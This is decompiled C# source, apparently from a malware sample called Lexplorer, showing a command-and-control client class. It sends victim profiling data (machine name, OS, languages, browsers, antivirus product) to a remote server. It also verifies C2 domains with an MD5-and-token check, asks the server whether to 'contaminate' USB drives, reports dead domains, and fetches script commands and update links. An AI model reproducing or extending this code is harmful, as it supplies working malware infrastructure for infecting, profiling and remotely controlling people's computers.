using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Xml;

namespace Lexplorer;

internal class Class8
{
	private Class4 _transport;

	private Class26 _userInfo;

	public Class8(Class4 transport, Class26 userInfo)
	{
		_transport = transport;
		_userInfo = userInfo;
	}

	public string GetBlockListMd5()
	{
		string parameters = "method=block&format=xml";
		try
		{
			string text = _transport.Recieve(parameters);
			if (text == null)
			{
				return string.Empty;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(text);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//head");
			if (xmlNode == null)
			{
				return string.Empty;
			}
			XmlNode xmlNode2 = xmlNode["body"];
			if (xmlNode2 == null)
			{
				return string.Empty;
			}
			return xmlNode2.InnerText;
		}
		catch
		{
			return string.Empty;
		}
	}

	public string GetBlockList()
	{
		string parameters = "method=blockList&format=xml";
		try
		{
			string text = _transport.Recieve(parameters);
			if (text == null)
			{
				return string.Empty;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(text);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//head");
			if (xmlNode == null)
			{
				return string.Empty;
			}
			XmlNode xmlNode2 = xmlNode["body"];
			if (xmlNode2 == null)
			{
				return string.Empty;
			}
			return xmlNode2.InnerText;
		}
		catch
		{
			return string.Empty;
		}
	}

	public static bool CheckDomain(string domain, string authToken)
	{
		string empty = string.Empty;
		empty = ((!domain.StartsWith("http://")) ? domain : domain.Substring("http://".Length));
		int num = empty.LastIndexOf('.');
		if (num != -1)
		{
			empty = empty.Substring(0, num);
		}
		MD5 mD = MD5.Create();
		byte[] array = mD.ComputeHash(Encoding.ASCII.GetBytes(empty));
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X"));
		}
		string text = stringBuilder.ToString() + authToken;
		try
		{
			Class4 @class = new Class4(domain);
			string text2 = @class.Recieve("method=test&format=xml");
			if (text2.ToLower().Contains(text.ToLower()))
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public bool ShouldWeNeedToContaminateUsb()
	{
		string parameters = "method=usb&format=xml";
		try
		{
			string text = _transport.Recieve(parameters);
			if (text == null)
			{
				return false;
			}
			text = text.Replace("\n", "").Replace("\r", "");
			if (text.Contains("<status>1</status>"))
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public bool InformAboutDeadDomain(string domainName)
	{
		try
		{
			int num = domainName.IndexOf("://");
			if (num != -1)
			{
				int num2 = domainName.LastIndexOf(".");
				if (num2 != -1)
				{
					domainName = domainName.Substring(num + 1, num2 - num - 1);
				}
			}
			string parameters = "method=domain&format=xml&d=" + domainName;
			string xml = _transport.Recieve(parameters);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(xml);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//head");
			if (xmlNode == null)
			{
				return false;
			}
			XmlNode xmlNode2 = xmlNode["status"];
			if (xmlNode2 == null)
			{
				return false;
			}
			string innerText = xmlNode2.InnerText;
			return (innerText == "1") ? true : false;
		}
		catch
		{
			return false;
		}
	}

	public bool SendUserInfo()
	{
		try
		{
			string text = string.Empty;
			string[] installedLanguages = _userInfo.GetInstalledLanguages();
			string[] array = installedLanguages;
			foreach (string text2 in array)
			{
				text = text + text2 + ";";
			}
			string antivirusName = _userInfo.GetAntivirusName();
			string text3 = string.Empty;
			installedLanguages = _userInfo.GetBrowserList();
			string[] array2 = installedLanguages;
			foreach (string text4 in array2)
			{
				text3 = text3 + text4 + ";";
			}
			string parameters = string.Format("method=create&format=xml&uid={0}&b={1}&l={2}&n={3}&v={4}&z={5}&il={6}&bw={7}&av={8}", _userInfo.ID, _userInfo.Is64BitOs.ToString(), _userInfo.MachineLanguage.Replace(" ", "_"), _userInfo.MachineName.Replace(" ", "_"), _userInfo.OSVersion.Replace(" ", "_"), _userInfo.TimeZoneOffset.ToString(), text, text3, antivirusName);
			string text5 = _transport.Recieve(parameters);
			if (!text5.Contains("<status>1</status>") && !text5.Contains("<status>0</status>"))
			{
				return false;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public string GetScriptCommandXml()
	{
		try
		{
			string text = _transport.Recieve("method=link&format=xml&uid=" + _userInfo.ID + "&v=" + Application.get_ProductVersion());
			if (text != null)
			{
				return text;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	public string CheckForUpdate(string version)
	{
		try
		{
			string text = _transport.Recieve("method=version&format=xml&uid=" + _userInfo.ID + "&v=" + version);
			if (text != null)
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(text);
				XmlNode xmlNode = xmlDocument.SelectSingleNode("//head");
				if (xmlNode == null)
				{
					return null;
				}
				xmlNode = xmlNode["status"];
				if (xmlNode == null)
				{
					return null;
				}
				string innerText = xmlNode.InnerText;
				if (innerText != "1")
				{
					return null;
				}
				xmlNode = xmlDocument.SelectSingleNode("//body");
				if (xmlNode == null)
				{
					return null;
				}
				xmlNode = xmlNode["update_link"];
				return xmlNode.InnerText;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}
}
